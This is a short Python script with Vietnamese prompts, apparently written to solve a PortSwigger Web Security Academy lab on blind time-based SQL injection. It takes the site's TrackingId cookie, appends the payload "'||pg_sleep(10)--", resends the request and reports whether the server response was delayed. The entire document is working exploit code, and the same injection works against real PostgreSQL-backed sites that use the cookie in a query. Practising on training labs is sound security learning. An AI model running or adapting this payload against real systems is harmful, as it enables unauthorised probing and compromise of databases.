import requests
import time

print("Nhập URL giống như này (pls): https://(your-lab-id).web-security-academy.net/ ")
base_url = input("Nhập URL: ").rstrip("/")

session = requests.Session()
res = session.get(base_url)

tracking_id = res.cookies.get("TrackingId")
session_id = res.cookies.get("session")

payload = tracking_id + "'||pg_sleep(10)--"

cookies = {
    "TrackingId": payload,
    "session": session_id
}

print("[!] Gửi request có chứa payload gây delay...")

start_time = time.time()
res = session.get(base_url, cookies=cookies)
end_time = time.time()

elapsed = end_time - start_time

if elapsed >= 10:
    print(f"[+] Ngon! Server bị delay {elapsed:.2f} giây.")
else:
    print(f"[-] Thua. Server ko bị delay </3 ")